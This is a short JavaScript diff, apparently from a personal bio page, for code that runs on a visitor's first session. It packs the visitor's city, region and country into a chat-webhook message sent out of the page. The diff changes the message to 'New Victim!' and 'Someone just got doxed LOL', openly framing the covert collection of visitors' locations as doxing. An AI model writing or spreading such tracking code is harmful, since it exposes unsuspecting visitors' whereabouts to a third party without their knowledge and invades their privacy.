@@ -16,8 +16,8 @@ if (!sessionStorage.getItem("visited")) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           embeds: [{
-            title: "📡 New Visitor",
-            description: "**Someone just visited ak47.bio**",
+            title: " New Victim!",
+            description: "**Someone just got doxed LOL ak47.bio**",
             color: 0x000000,
             fields: [
               { name: "📍 Location", value: `${city}, ${region}, ${country_name} (${country_code})`, inline: false },
